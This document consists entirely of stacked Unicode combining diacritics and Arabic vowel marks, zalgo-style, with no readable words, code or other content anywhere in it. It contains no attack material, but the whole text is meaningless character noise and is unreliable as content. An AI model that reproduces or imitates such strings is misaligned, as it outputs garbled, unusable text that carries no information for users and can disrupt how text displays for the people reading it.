̵̸̷ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ͕̻̹̻̞̩͇̥͉̤ͫ͐̎̏̿ͪͩͥ́͊͘͘͘͜͜͠͞͞͏̷̶̵ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̛͕̰͎͕͎͍̹͇ͩ͆ͯ̈́̍͐́̾ͧ͘͘͘͜͜͝͞͝͏̷̵̸̷̸̴̴̸̴̸̶̸̴̴̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̡̢̡̢̢̨̨̛̛̛̦̪̞͓̳̪̝͖̤̼͈̻̮̦̯̰̮̟̫͇̤͚̠̞͍͉̘̪̰͚̦̭̫͙̻̮̹͙͉͉̬͍͓̞̦̦͇͕̟̥̗͇͔̬ͯͤ͊̐ͬ̔ͥ̌̐̄͂̌̇̄́͐́̎ͥ̔̂̀̈́͊ͦ̅̀̀ͤ͊̒͊̇̽̀͑̆ͪͨ̇̑̉̂ͭ͐̂̽ͭ̌̀̆́̈̕͘͜͜͢͢͢͜͢͝͞͡͡͝͞͡͡͠͠ͅ҉ًٌَُِ̨̥̤̀̇͜͟͏̸ًًٌٌٍٍََُُِّّ̢̨̨̨̹̦̻̙̳̭̩̻ͭ̋̇ͪ͋͒̉͜҉̴̴̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̨̳̗̠͚͙̹͕̩͖̳̦͔̳̤̹͂͗̋͋̋͐̅̀̽͗͛́̂̄͗̏̿̚͝͡͠͞͡ͅ҉̸̴̴̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̧̨̢̧̗̮̠̥͚͈̗̘̠̻͚͕̰͍̬̲̼̃ͦ̏̆̊̑͆ͯ̋̀̍̆ͪ̔́ͧ̂̉ͮ͟͝ͅ͏̵̵̸̸̷̶̷̸̶̵̷̴̸̶ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̢̢̧̨̛̛͈̩͎̥̫͈̹͓̮̰̜͉̮̲̘͉͇͈̻̠̥̬͙̼̭̰̘̪̭̖̣͉͈̻̙̦̭̼̜̒̅̀̃̽̓̊̃̀̾̄̔͑͛̉̌͑́͆̔ͨ̈́ͨͪͯ̀̄ͦ̑́͛̅̿ͪ̌́ͫ̉̾̆͌ͧͣ̒̆̎̈́ͯ͑ͦ̉̕̕̕̚̕͘͜͟͞͠͠͝͠͝ͅ҉̴̷̵̸̶̷̵̷̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̨̨̢̢̧̢̧̧̡̡̞͎̼͍̤̞̩̟̳̹̺̭̹̦̪͔͖̻̼̖͔̲̜͍̯͇͕̘̫͈̥͓̪̾̓̎͗̈́̑̂̋ͪͫ̆̃͐͆ͭͧͨͧ̒̎̈́́͑ͤ̍ͮ̂́͋̀͌ͩͨ̌ͯͥͭ̀̇̆͐̌͋͑̇̀͌̀̕̚͘͟͜͟͟͠͠͞͠ͅ҉̷̴ًٌٍٍَُِِّ̡͙͓̬̱̗̼̜́ͫͨ̈͢͏ّ̘͏̷̸ًًًٌٌٌٍٍٍََََُُُِِِّّّ̧̢̢̛͉̮̺̳̰͍̗̪̜̹̍̈́̓̅̿̉̾ͨ͑́́̚͠͝҉̵̴̷̵ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̢̛̛̜̱̻̞͉̻̲̺̖ͥ̄̃̀́̄̍̐̈́͒̓̚̚͜͞͡҉̸̵ًًًًٌٌٌٍٍٍٍََََُُُُِِِّّّّ̧̢̢̛̗̺̺̜͇̘̖̜̯̠̺͓̜̫̺̳͗ͦͣ͊ͧ̎̊ͩͥͩ̾͌̀ͩ͟͢͜͠͝҉ًٌٍَِّ̼̱͙̒̓̒͟҉̴ًٌٍَُُِّ̞̰̲̖̅̐͐̉͜͡҉̶̶̶̷ًٌٌٍٍَُِِّ̢̺̙̯͙̝ͬͫ̈́̆͟͡͝͏̸̷̷̴̸̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̧̡̢̢̢̢̢̛̛͍̝̺̳̻͎͍̲̯̮̥̦̩̣̖̗͍̮͓̯͖̪̫̠͉̯̇ͮͤ̑ͦ̾ͣ̈́͛͗ͥ́͐͒̇́̓̏̅͒͗̿̈͗̀̃͋̂̐͘͘͘͟͟͜͜͢͢͠͠͠͝ͅ҉̷̴̴ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̢̨̡͖͎̙͓̠͖͇͈̤͇ͪ̔ͥͮͣ͊ͣ̍͑̅ͮͦ̀ͮ͠͞҉̵̶̷̸̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̡͉͕̙͈͓̻̻̠͇̪̫͖̭̬͙̤̥̗͍͓̩̬̮̈̿̄̊͋̓́̄ͮ̂̓̽͗̒ͨ̄̔̀̇̾͆̈́͋͢͢͝͡͡͠ͅ҉̸̷ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̨̨̛̱͍͉͔̯̲̬̲̩͈̦͖͂ͦ͛͂͛̀̈͐ͫ͐̀̄̅͘̚͜͜͠͡҉̵̶ًٌٌٍَُِِّ̞̼̘͔̲̿͑ͬ̌̅͜͏̸̴̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̨̛̛̫͉̠͈͈͙̯̻̙̫̘̩̝̩ͮ̊̄̓ͭ̐ͮ́̒́ͭͣ̀̕̕͞͞͞ͅ͏ٍَّ̘͋ͯ̚͝͏̴ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̢̛̛̛̩̬̩̹̲͇̰͎̭̹̤̤ͪ͒̈ͯ͐͂̆ͮ́̃͂ͪ̃̕͜͟͡͝͠҉̴̴̶ًًًٌٌٌٍٍٍٍَََُُُِِِّّّ̨̛̗̫͔̳̞̻̲̰͖͆̐ͫ̆̀ͥ̀̆͊̚̕͝͠͞҉̵̷̵̸ًًًٌٌٍٍَََُُِِّّّ̡̡̳̝̭̮̬͙̹̮̃͛́̈̂̐̓ͯ͠҉ًًٌٌٌٍٍََُُُِِِّّ̨̨̡̡̻̟͕̯̯ͧ͒̈́͐́̂̐ͣ̀ͬͯ͘͜͝͞҉̴̸ًٌٍٍَُِّ̩͓̙͖̚͜҉ًٌَُّ͉̻̮͎͐͆͠͝͏̴̸̷̸ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̡̨̨̛̯̤͙̮͇̺̲̗̱͔̻̜͚̖͔̥̻͚͉͚̤̮͕͙̹͍̦͇̺̠̖͇̤̰͓̀ͯ͒̉̀̄ͪ͒ͯ͒̀̾̀͒ͨͮ́ͪ̊ͮ̾͌͗́̉̈́̑́̇ͯ̒͊̀ͦ̚͘̕̕̕͟͢͟͞͡͡͡ͅ҉̷̶̷ًًًٌٌٍٍٍَََُُِِّّّ̧̧͙̜͎̘̠͇ͤ͑ͭ͂́ͭ͟͠҉̵ًًٌٌٍٍََُُُِِّّ̧̨̭̙̭̠̭̥̳ͬ̔̎͐̕̕͞҉ٌٍِ̘̳̙ͭͪ̀̕҉̸̴̸̵̵̷̶̷̴̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̧̧̡̢̢̧̨̨̧̢̡̛̛̣̤͉̪̤͖̖̺͙̠̫̣̹͓̳̙̦̹͖̪͍̝̣͇̯̘̺͓̲̩͖̼̯̣̪̪̞͓̯̱͇͕͌́͌̓̆ͪͥ͑ͦͩ̒̽ͨ͆́̀̓ͬ̅̓̈́̽͊́̈́͆ͮͭͩ́̀ͯ̓ͪ́ͯ̒͋͑ͧ̆̉̾ͪ̑̏̆́̀ͩ͆̐ͬ̀ͪ͒͋͑̆̆̕͘̚͘͘̕͘͟͢͜͜͢͢͢͜͞͞͠͝͞͡͠͠͝͞͡͝ͅͅͅͅ͏ًٌٍَُِّ̺̬͗ͬ̆͞͠҉̴̸̶̴̵̸̴̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّ̨̡͍̣̮̯̪͔̗̗̦̮ͭ̆͑̓ͧ͂͒̂͐͌̔̊̓̀͌̊ͨ͗ͮͫ̉͟͟͢͞͞͠ͅͅ͏ٌٍَِّ̺̜̥̓͞͏ً̩͏̴̷ًٌٌٍَُُِّ͚̜͉͗̒́̿͑͐͢͠͏̶̴̶̶̶̷̴ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̧̡̢̨̛̛̹̭̤͍̳̘͓̳͓̜̪̰̱͚͙͚̫͙͙̻̮̫̜̟̘͈̭̤̻̗̰͔̪͎ͪ̀ͬ̐̓̒ͣ̄͋̀̅ͣͫͮ̾̃́̈́ͫ͗̔͆̾ͯ̑͂͛ͥ̏̉ͦ̈́͑̔͗̀ͤͤ̎͘͘͘̕̕͘͘̕͟͟͢͢͢͢͞͝͠͝͝͡͝͠͞͠ͅͅ͏̴̴̵̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّّ̢̢̨̨̜͈̻̠̩͔͉̘̣͚̱͙͍̭̟̻̜̳̟͙͇̄ͣ́́͊͊ͥ́̓̈͂́ͤͭͨ͆ͩ̀̏ͭ̃͘͘͞͝͝͞͝͏̷̴̷̸̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̡̧̛̭͇̠̪̭̩͓͈̤̠̫̦̟̹͎̹̩͈͎̆̓̈ͮ͋̽̎ͪ̒͊͗̉̂ͩͥ͆̈́̄̍͒̒̌̂͌̄ͣͣ̏ͬ͑͘͘͘͘̚͜͜͢͠͞͞ͅ҉َّ̦̎͐͏̷̸ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛̯̯̝͔̳̣̜̲̦͂́ͤ͛ͫ̂̂͑ͤͬ͆̍͊͘͘̕͟҉̷̶̵̷̷̸̵̴̴̴̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̨̨̢̡̢̢̛̱͔̤̞̺̹̞̯̰͔̪̥͙̰̯͈̩̱͈̼̖̜̱̺̞̦͖̯̭̄ͮͣ͐̄̒̈́̓͆̀͑͑̿̄ͣ̋̈́͆ͫͪͫͪ̑ͣ͂̔̀͑ͫ́̕̕̚͢͢͟͜͜͝͠͡҉̴̴̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّّ̡̡̡̢̨̡̛̛̲͇͕̖̘͎͙̥͎̠̜̙̤̱̖̖̤͔͉̹͕̝͚͕͔͊̅̋̄ͦ̎ͬ̌͒ͧ͑͊́͛͆̔̀͛͛̓̀̃́͊̀̄ͧͦ͛͘̕͜͡͡͠ͅͅ͏̶̸̵̴̷̵̶̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̢̧̡̡̛̻͎̹͈̥͇̗̺͇̰̮̩̘̖̪̗̝̻̯̝̖̯̖͎͇̲̳̯̲̋͌̑̽̿̏̀͌ͧ͊̌̓ͣ́̀̀͒͛͛̑̌ͣͪͣ̆̔͆̒̈̽ͤͥ́̒ͬ̕̕͢͟͟͢͜͟͢͢͟͢͠͝͞͝͝͠͝͡͝͝ͅ҉̷ًًًٌٌٌٍٍٍٍَََُُُِِِّّّّ̨̨̨̧̛̝͉̮̹̗͇̠̹͇̳̻̲͎̈́ͫͫͥ́͌̽ͩ̓̐̕͜͠͝҉̶ًًٌٌٍٍَََُُِِّّ̧͕͈̺͎̩̰̭̖̯̎́ͭ̊͐́͋̀̕͢͢͝͏̸̵̴̵̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̨̡̨̛̹͈̙̬͈͖̖̬̠͇͈͖͎͈̼̙͖̼̱͈̀̊̓ͧͥ̀ͦͤͣ͑̎̒ͭ̉̿̉́ͬ͂̄ͫ͘̕͢͝͞͠͠͝͠͝͝ͅ҉̷̵̴ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̨̡̨̛̖̗̹̹̦̣̝̜̠͍̣̞̠̟ͩͮ̀͛̆̓͆ͮ̓̍̂̽̊̿ͫͯ̂̋ͯ͋͘͘̚͟͜͢͟͟͞͡ͅͅ͏̶̵ًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̧͍̱̳͔̯̙̼͕̮̠̙͇ͨ͗́ͤͮ̍̑ͯͯ̓̋̚̕̕̕̕̚͟͢͢͏̴̵̵̵ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̧̢̧̛̻͖̱̘͔͇͖̗͍̗̳̲͙̺̩̰͈̤͖̣̲ͮ̊̆ͩ̃̉̀̒̌̈ͬͦ̆́͌̔̇͘̕͜͡͠͞͝ͅ҉̴ًًٌٌٍٍٍََُُِِِّّ̛͉̣̥̙͇̥̰̮̣̑̽̿͗͌̐͑́ͩ̄̚͡͏̵̷̴̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̡̧̡̢̨̡̧̨̡̡̨̯̫̠͔̦̯̱̻̬̯͉̗̮̠̜͙͓̦̜̪͕͍̙͉̎̈́̉̑͐ͬ̓̄͊͂̋͋ͦ̒̐̓͌́ͪ̈ͧ͊͂ͪ̐̀̽́ͣ͑͆ͧ͑ͨ͐ͮ̚͟͢͢͟͟͡͡͞͞͝͠҉̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̛͙̺̤̜̪̥̦͙̫̙̒̍ͤ͗̍̅̕̚̕͟͡ͅ҉ًًٌٍََُُِّّ̧̢̛͕̯̼̯͕̣͈̮́̽̇ͭ͘͢͡͏̸ًًٌٌٌٍٍََُُِِِّّ̡̧̨̛̞̙̼̟͙͖̤͈ͩ̾ͬ̂̈͒͒̚̕͢͝͞͡͏̴̶̷̸ًًٌٌٍٍََُُِِّّ̛͎̣͍͈͈̱̱̍̔ͨͣ̊̚͘̚҉̴̷̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̨̨̡̛͇͕̬͇̤͎͇͍̟̞̘͓̣͍̗̤͈͑̐ͮ̐̇̎ͦ̃ͮ̃̋ͤ͐ͤ́͝͠͏̴̴ًًٌٍٍََُُِّّ̧̡̢̨̜͈̯̞̻͇ͮ̇̈́̂͌͗͏̷̶ًًًٌٌٌٍٍٍَََُُِِِّّّ̧̡̛̤̙̩̺̠̭̩̫͎͋̓̾̑̿̀ͧͮ̒͟͠͞҉̶ًٌٌٍٍَُُِِّّ̡͇̰̜̙̱͕̖̊̅̍ͣ̉̚͟͠͞҉̶̷ًًٌٌٍٍََُُِِّّ̗̱̪̠̱̹͊̒̀͊̈́͊̀̃͢͞͞͡͏َ͇ͤ҉̶̸̴̸̶̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̨̛̛̟̪͖̞̥̦̝͖̠̤̩͍͚͇̘͖̟̭̭̩̦͓͐̊͆͛ͩ̎̐͂̀̀ͫ̀ͩ̿̃̽̆̐͋̈ͯ̍̀ͩ͘͢͟͡͠҉̸̴ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̧̢̨͔̣͚̗̭̞̮̰̲͖̟̪̥͉̟͑̽́ͪͭͭ̈́̽̑ͨ̿̊́̍̆́̓͟͞͠҉̶ًًٌٍٍََُُِِّّ̢̡̰̹͙̖̹͔͖̜͍̏́ͯ́̓͟ͅ͏̸ًٌٍَُِّ̹ͩ͂̄̽̕҉̵̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̢̛̛̞̫̲̩̹̬͔̦̙͈̜͔̹͓̥̙̣͑̉͊͂̍ͤͤ̓̒͒ͬͨͮ̌͝͡͝͏̴̴̴̷̷ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̨̧̡̛̛̲̪̝̦̟̥̫̯̳̲̻̠̞̮̭̠͔̲͔͖͔̳̙̞̥͇̱͔̉̏̿̋͐̊ͫ̔̈́̆ͧ̒̀̈́ͣ͂̌̿̇̌̂͆ͭ͗͆͌̕̕͟͟͟͜͢͡͞͝͞ͅ͏̸̵ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̼̩̯̫̖̣̱͚̠̜̦̹̝̯̎́̉̎ͧ̓̎́ͣͬ̚͞͡ͅ͏̵ًًٌٌٍٍََُُِِّّ̨͚͖͙̰̱̩̮̥͎̯̾̓ͥ͛ͫͥ̾͜͡͞͏̶̶̷̸̷̷̷̴̷̴̴ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̢̢̨̢̢̨̛̺̱͕̟͉͎̙̲͖͖̟͕̝̻̺̪͖̜̠̰̟̩̟̺̳̙̲̹̪̖̩͔̞̥ͧͨ̊̃͊́͋̿́̑͋ͦ̓ͪ̌ͣͮ͊͌̄̆ͬ̈̋̐̀̒̊̐͌̄̐̽̌̈́̋͆ͨ̐̽̉ͪͨ͘̚̕̚̕͘͢͢͟͟͡͞͝͡ͅ͏̷̸̷̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̨̢̧̛̘͙̲̺̫͚͍͎͓̟͇͎̦̯͖̱̮͉̳̱̯̦̥̭͇͍̣͕̻͔̞̽͋͋̌ͭͥ͋͗̉ͥ̑̃̓̀́͌ͬ̒ͤ̎͗ͯ͑ͤ̀ͩ́̌̀ͮ̂̓͆ͬ̀͘͘̚̕͘͘͟͜͟͟͜͝͞͞͝͡͠ͅ҉ًَُّ͍̬ͨ̓͝͡͝͏̴̴̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̨̡̪̮̻̫̫̤̯͈̬͉͉͍̙̜̳̪͇ͪͬ̈́̆̊̆̓́̀͆̽̇͂ͩ͆ͪ̾͐̀́ͮ̂͘͜͢͟͝͝͝ͅ҉ّ̝҉̴̴̵̷̴̶̴̵̸̷̶̷̷ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̨̢̨̧̨̡̧̛̙͔̰̹̟̯̟̘̬͓̞̠͕̪͍̭͍̹̯̘͙̜̖͈̳͍̤̪͍͓̥͇͉̦̰̰̠̳̺̥͎̩͉̍̌̀̏͋̇́͗̌ͯ̈́́ͯ͂͛̍̂̿͋̋ͭ̅͒͊́̀̽̔̀͑ͬ̌̂͛͛̄̽̃̄ͯͨ͘̕͘͟͜͜͟͢͢͢͠͞͞͞͠҉̶ًًٌٌٍٍَُُِِّ̲̙͔͕̯̻̘͎͊ͤ͂ͩ͒̿͜͟͝͏̶ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̢̧̨̡̛̛̛͍̳̗̥̰͇͙̗̘͋͗̑̓̀̂ͩ͗̕͟͝͞͞ͅ҉̶̸̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّ̨̧̧̨̢̢̡̢̖̤̰̗̹̺͙̳̰̪̹̮͓͎̦͇̦̞̞͓͖͔̬̣͕͎̰͕̥̙͕̯͐̋ͧ͆́͐́̉͑ͭ͋͌ͫ͂ͥ̊̉̃͛͆ͯ̋ͬ̇ͨ̑̆͌́̓ͥͪ̇͐̕͘͘̚͢͢͜͜͢͟͡͠͞͠͞͝͠͝͝͠ͅͅ҉̸ًَُّ̤̫̘ͫ͋҉̸̴̴̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̧̨̛͖̪̻͇͓̰̭͎͖̼̗̰͉̩̹̤͒ͩ̊̈͐̀̏ͥ̄̊͆̓ͥ͘͘͟͠͝͝͝͠҉ًٌٍٍَُِّّ͚̖̅̓̆̍͞͏̷̵ًًًٌٌٍٍَََُُُِِّّ̡̡̛̦̲͈̳̳̗̔ͧ̔ͫ̋̅͒̓̔͜͢͡͠͡͝͝ͅ͏ٌِ͔̃͏ًًٌٍٍََُُِّّ̘̹̗͖̙̬̺ͧ́ͣ̈ͥ͑͘͏ًٌٌٍٍَُِِّ̡̢̫̣̀̔ͬ̉̕͟͞͝ͅ͏ًَّ̝̉҉̵ًٌٌٍٍَُُِِّّ͉̰̹̮̯̟͓̝͔̎́͆̊̂̌͟͟͝҉ًٌٍَُِّ̘̱̬̩͂ͭͬ҉̷ًٌٍَُِ̳̞̮̄̎̂ͣ͢͝͏̵̶ًًًٌٌٍٍَََُُُِِّّّ̢̡̢̫̲̪̫͍̙͉̘͉͍͓͂ͭ̏ͣ͘͟͜͢͝͠͏ٌ͎̄҉̵ًًٌٌٍٍٍَََُُِِِّّّ̨̨̧̨̧̡̡͖̙̗̪̰̤ͯ̂̓ͩ̄ͧ̋̇͆̉ͣ͟҉ًًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̰̣̦̠̰̰̝̱̫̜̝͔͖͉̋͊́̈̈́͑ͯ͛̀̀ͪ̽ͥ̅̑̕̕͟͜͢͝͠͞͠͞͠͡͠͝͏̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̨̨̠̻̳̺̲̻̻̯͍͈̳̩ͯ̀̄̽ͤ̔́̅͌̀͘͞͏̶̴̷ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̧̨̨̨̛͖̮̣͕̫͇̖͉̣͓̥͈̲͙̈́ͧͫͭͣ̽ͬ̈́̐̽̌̑̄̂͛̈́̀̍̎̕͘͜͡͡͝ͅ͏ًٌَُِ͙̈́͜͡͞҉ٍّ҉̵ًٌٍََُِّ̤̥̗͒̈̋̀͂͟͏̶̷̴ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̛̛̛̛̯̳̟̯̦͓͎̲̺͎̯̣̜̈ͤ̒̂̅̀͐́̽́̏ͬͮ̊̕̚͢͢͟͡͝͡ͅ҉ٌٍَُِّ̢̻̙͛͋́͗͑͞҉ًًٌٌٍَُُِِّ͙̜̱͇̜̔͐̐̐͗̓̕͘͜͝͠͏ًٌٍَُِّ̛͇͙̼̫̘ͧ̀̒̀ͤ̓̚̕͢҉̶ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّّ̡̧̨̡̠͉̙̖̖͔̙͈̲̹͖̤͚̔̏̏̃̍́ͩͨ́ͫ̏̇ͪ̽̔̆́́̀͘̕͢͢͠҉̷̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̡̡̛̗̰͙͖͉̼͕̝̦͙͚͇̪̗̺̹͍̰̹ͫ̍́ͬ̈́ͥ̈́̇̌́̈̂̄̍́̀̇̏͑̎̔̽ͪ͘̚͟͟͢͠͠͞͡͡͝͝͠͞͠͞ͅͅ҉̸̵̵̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̧̨̧̢̛͉͈̻̫͓̹̦̝͉̙̲̘̪͇͔͎̙̦̩̳̟̙̥ͤͪͥ̑̈́̀̌̾̈́̈͋͒͌́ͧ̂ͧ̚͜͜͜͞͞͏̶̶̵̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̡̛̛͉̦̱̯̻̜͍̳̖͎̜̪͖͙͖͉͈̣̖̗̾̔̈́̆ͫ̈́̎͗͌͑̎̃ͥ́̓̒̍́̋ͦ͛͜͜͜͟͝͠͝͏̷̸̸̶̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̛̖͉̱̲̖̟̫̖͖͔̜͉͈͎̩̥̥̹̿ͩ̂ͮ̏ͣ͒̈̃͂̈ͪ̕̚̕͘͟͝͏̸̷̷̵̴̷ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̢̦̬͔͖͕͚̦̘͙͈̙̬̙̩̻͍ͪ͒͋ͯͨ́̀̎̅̈̋ͪͮ̇̾ͥ͂̀́ͫ̽̕͢͝͠͡͞͠͞͞͠͏̷̶̷̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̧̨̨̨͓̹̩̗͓̖͖͚̺̟̲̹̥͍͉̜̺̙͎͉̗̘̲̺̓̎̅ͨ̿͗ͮ̇ͦ̽̑̃̀ͪ͑̐̄̂̀̃ͮ̀ͦ̉͊̒ͪͣ͂ͧͥ̚̕͘͘͘͘͟͜͝͝͞ͅ҉̷̵ًًٌٌٍٍٍََُُِِّّّ̛̤̤̟͇͔̹̒͆͆̀̍̿͌͝͝҉ًَ̐͠͏̶̶̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̢̢̛̯̦̩̪͚̬̖̯̦͖̞̰̦̘͓̭̹̹̙̩̝́̈ͮ͐͋ͧ͂͂̎̇̄̂́̔̂͑͆́̚̕͘͠͞͡͝͠҉̶̴̷̶̶̸̴̸̸̶̵ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّ̧̡̧̧̢̨̡̧̨̧̨̧̛̛̛͍̜͎̼͎̱̹̦̹͍̜̟̜͉̳̣̣̹̭̠̠͔̖̘̯͓̘̹͍͇̳͕̞̳̞̯̼̪̫̼̬̫̦̳͚̞͇̪̣̰̍́̊̀ͨ͂ͮͭ̌̽ͯ̀͂͛̂̐́̐̓̾̈́̎̊ͥ͂͐ͫͨ̆ͬͮ̑̐̊͒͆ͣ̍̋̿̐̀̐̓ͩͨ͒ͭ́͛̈ͩ̑͊̎ͯ̂͊̒ͩ̕̚̕̕̕̚͘̕͟͟͜͟͟͜͟͜͜͟͢͜͟͠͝͞͞͝͡͝͠͝ͅͅ҉̶ٌٍِّ̥̗ͪ͋͠҉ًَُ̧̮̮̀͡҉̸̷̵ٌٍَِّ͓͙̙͚̪̊͛҉̵̴̸̴̴̸ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̛͉̬͎̦̝̘͕̤͓͖̹̞͎̱̓̉ͫ̇ͩ̾̏̀̕̕͝͠͝͞҉̶̴ًًًٌٌٍٍَََُُُِِّّّ̢̢̧̛̣͎̟̤̮̲̰̃̏ͬ̈́͊̿̾ͥ̈́̕͟͜͢͞͞҉̸̸̵̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̢̢̢̛̛̩͖̫͎̘̞̯̬̤̜̣̰̣̼͓̝̯͈̹̠̫̏̀ͥ̾ͮ͐̒̇ͩ̄̽ͯ̇́́̔̀͑̀̽͜͜͢͝͞͏̶̸̶̷ًًًًٌٌٌٍٍٍََََُُُُِِِّّّ̛̗̳̞͍͔͚̪͔̠͗ͤ̅̄ͥͪ͂ͭ̀́̈̓͂͘̕͜͜͏̴̵ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̡̢̡̨̛̣͙̬͕͇̖̥̥̩̲̗̹̘̹͕̰ͤͪ̓́͐͐ͫ̀̈́ͫͦ̃ͧ́͛̎ͥͫ́̇̅͘͘͜͢͡͞͏̸̴̴ًًٌٌٍٍََُُِِّّ̡̨̗̮̞̭̙̤̎̑̒ͧͧ̓̌͂̑ͦ͞͝҉̶̶̸̷ًًٌٌٍََُُِِّّ̯̳̠̞̲̈̽ͦͯ͘͡͡͏ًًٌٌٍٍٍََُُِِّّّ̨̧̳̠̠̰̹̫͔̽́̆̊̓͊̕͘͟͜͠͏̴̶̸̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّ̡̧̧̡̡̡̨̧̛̜̺͓̞͚̯͔̮̘͇̮̼̖̲̙̮̱̠͈̥͚̣̤̘̘͚͖̘̀̀ͬ͐̌̉̂ͤ͊ͩ͒̓̑̐̓̀̍̌͗ͨ̅̔ͦͯ̉̃̈̋̇̕̕̕̚͘̚͟͜͢͡͞͠ͅ